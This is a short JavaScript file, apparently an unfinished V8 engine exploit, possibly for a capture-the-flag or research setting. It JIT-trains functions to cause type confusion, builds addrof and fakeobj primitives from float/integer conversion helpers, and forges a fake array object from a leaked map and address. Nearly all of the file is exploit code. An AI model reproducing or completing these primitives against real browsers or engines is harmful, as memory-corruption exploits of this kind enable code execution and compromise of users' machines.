// WORKING...
var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { 
	f64_buf[0] = val;
	return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { 
	u64_buf[0] = Number(val & 0xffffffffn);
	u64_buf[1] = Number(val >> 32n);
	return f64_buf[0];
}

class c_double{
	constructor(val){
		this.x = val;
	}
}

class c_object{
	constructor(val){
		this.x = val; 
	}
}

function getDoubleElement(obj ,idx){
	x = obj.x[idx] + 1;
	return obj.x[idx];
}
function getObjectElement(obj, idx){
	x = obj.x[idx] + 1;
	return obj.x[idx];
}
function getArray(obj){
	x = obj.x[0] + 1;
	return obj.x[0];
}
function getOOB(obj){
	x = obj.x[0] + 1;
	return obj.x[10];
}
function addrof(obj){
	var addr = ftoi(getDoubleElement(new c_double([obj]), 0)) & 0xffffffffn;
	return addr;
}
function getMap(obj){
	var map = ftoi(getDoubleElement(new c_double([obj]), 0)) >> 32n;
	return map;
}
function fakeobj(addr){
	console.log(addr, addr.toString(16));
	var fake = getObjectElement(new c_object([itof(addr)]), 0);
	return fake;
}
for(let i =0;i<0x10000;i++){
	getDoubleElement(new c_double([1.1]), 0);
	getObjectElement(new c_object([{a:1}]), 0);
}

var oob = [1.1, 2.2];
var oob2 = [1.1]
var array_map = getMap(oob);
var addr = addrof(oob);

oob[0] = itof((array_map << 32n) + array_map);
oob[1] = itof((array_map << 32n) + addr);
%DebugPrint(oob);
var fake = fakeobj(addr-0x10n);
getArray(new c_double([[1.1]]));
//console.log(addrof(fake).toString(16));
